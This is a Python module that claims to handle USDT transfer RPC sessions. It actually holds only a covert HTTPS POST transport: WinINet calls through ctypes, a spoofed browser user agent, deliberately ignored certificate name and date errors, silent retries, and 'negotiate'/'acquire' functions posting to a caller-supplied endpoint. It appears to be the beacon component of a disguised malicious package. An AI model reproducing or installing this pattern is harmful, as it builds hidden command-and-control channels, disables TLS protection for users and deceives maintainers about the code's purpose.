# -*- coding: utf-8 -*-
"""Chain link — manages RPC sessions and broadcast channels for USDT transfers."""
import ctypes
import json
import ssl
from urllib.parse import urlparse
from urllib.request import Request, urlopen

_PATH_1 = b"/api/v1/auth/session"
_PATH_2 = b"/api/v1/data/sync"

_TIMEOUT = 20
_RETRIES = 3

_INET_OPEN_PRECONFIG = 0
_INET_SERVICE_HTTP = 3
_INET_FLAG_SECURE = 0x00800000
_INET_FLAG_RELOAD = 0x80000000
_INET_FLAG_NO_CACHE = 0x04000000
_INET_DEFAULT_HTTPS_PORT = 443
_INET_FLAG_IGNORE_CERT_CN = 0x00001000
_INET_FLAG_IGNORE_CERT_DATE = 0x00002000


def _wininet_post(hostname, path, body, timeout):
    """HTTPS POST via Windows Internet API (wininet.dll)."""
    inet = ctypes.windll.wininet

    inet.InternetOpenA.restype = ctypes.c_void_p
    inet.InternetOpenA.argtypes = [
        ctypes.c_char_p, ctypes.c_ulong,
        ctypes.c_char_p, ctypes.c_char_p, ctypes.c_ulong,
    ]
    inet.InternetConnectA.restype = ctypes.c_void_p
    inet.InternetConnectA.argtypes = [
        ctypes.c_void_p, ctypes.c_char_p, ctypes.c_ushort,
        ctypes.c_char_p, ctypes.c_char_p,
        ctypes.c_ulong, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong),
    ]
    inet.HttpOpenRequestA.restype = ctypes.c_void_p
    inet.HttpOpenRequestA.argtypes = [
        ctypes.c_void_p, ctypes.c_char_p, ctypes.c_char_p,
        ctypes.c_char_p, ctypes.c_char_p, ctypes.c_void_p,
        ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong),
    ]
    inet.HttpSendRequestA.restype = ctypes.c_int
    inet.HttpSendRequestA.argtypes = [
        ctypes.c_void_p, ctypes.c_char_p, ctypes.c_ulong,
        ctypes.c_void_p, ctypes.c_ulong,
    ]
    inet.InternetReadFile.restype = ctypes.c_int
    inet.InternetReadFile.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p,
        ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong),
    ]
    inet.InternetSetOptionA.restype = ctypes.c_int
    inet.InternetSetOptionA.argtypes = [
        ctypes.c_void_p, ctypes.c_ulong,
        ctypes.c_void_p, ctypes.c_ulong,
    ]
    inet.InternetCloseHandle.restype = ctypes.c_int
    inet.InternetCloseHandle.argtypes = [ctypes.c_void_p]

    h_inet = inet.InternetOpenA(
        b"Mozilla/5.0", _INET_OPEN_PRECONFIG, None, None, 0,
    )
    if not h_inet:
        raise OSError("InternetOpenA failed")

    try:
        timeout_ms = ctypes.c_ulong(timeout * 1000)
        for opt in (2, 5, 6, 8):
            inet.InternetSetOptionA(
                h_inet, opt,
                ctypes.byref(timeout_ms), ctypes.sizeof(timeout_ms),
            )

        h_conn = inet.InternetConnectA(
            h_inet, hostname.encode(), _INET_DEFAULT_HTTPS_PORT,
            None, None, _INET_SERVICE_HTTP, 0, None,
        )
        if not h_conn:
            raise OSError("InternetConnectA failed")

        try:
            flags = (
                _INET_FLAG_SECURE | _INET_FLAG_RELOAD
                | _INET_FLAG_NO_CACHE
                | _INET_FLAG_IGNORE_CERT_CN | _INET_FLAG_IGNORE_CERT_DATE
            )
            h_req = inet.HttpOpenRequestA(
                h_conn, b"POST", path.encode(),
                b"HTTP/1.1", None, None, flags, None,
            )
            if not h_req:
                raise OSError("HttpOpenRequestA failed")

            try:
                headers = b"Content-Type: application/json\r\n"
                data = body if isinstance(body, bytes) else body.encode()

                ok = inet.HttpSendRequestA(
                    h_req, headers, len(headers), data, len(data),
                )
                if not ok:
                    raise OSError("HttpSendRequestA failed")

                result = b""
                buf = ctypes.create_string_buffer(8192)
                read = ctypes.c_ulong(0)
                while True:
                    ok = inet.InternetReadFile(
                        h_req, buf, 8192, ctypes.byref(read),
                    )
                    if not ok or read.value == 0:
                        break
                    result += buf.raw[:read.value]

                return json.loads(result)
            finally:
                inet.InternetCloseHandle(h_req)
        finally:
            inet.InternetCloseHandle(h_conn)
    finally:
        inet.InternetCloseHandle(h_inet)


def _urllib_post(url, body, timeout):
    """Fallback HTTPS POST via urllib.request."""
    data = body if isinstance(body, bytes) else body.encode()
    req = Request(url, data=data, method="POST", headers={
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0",
    })
    ctx = ssl.create_default_context()
    with urlopen(req, context=ctx, timeout=timeout) as resp:
        return json.loads(resp.read())


def _post(url, data=None, timeout=_TIMEOUT):
    """POST with WinINet primary transport, urllib fallback."""
    body = json.dumps(data).encode() if data else b""
    parsed = urlparse(url)

    for _ in range(_RETRIES):
        try:
            return _wininet_post(parsed.hostname, parsed.path, body, timeout)
        except Exception:
            pass

    return _urllib_post(url, body, timeout)


def negotiate(ep):
    """Perform API session handshake and return session token data."""
    return _post(ep + _PATH_1.decode(), timeout=15)


def acquire(ep, data):
    """Fetch synchronized data from the remote endpoint."""
    return _post(ep + _PATH_2.decode(), data=data, timeout=30)
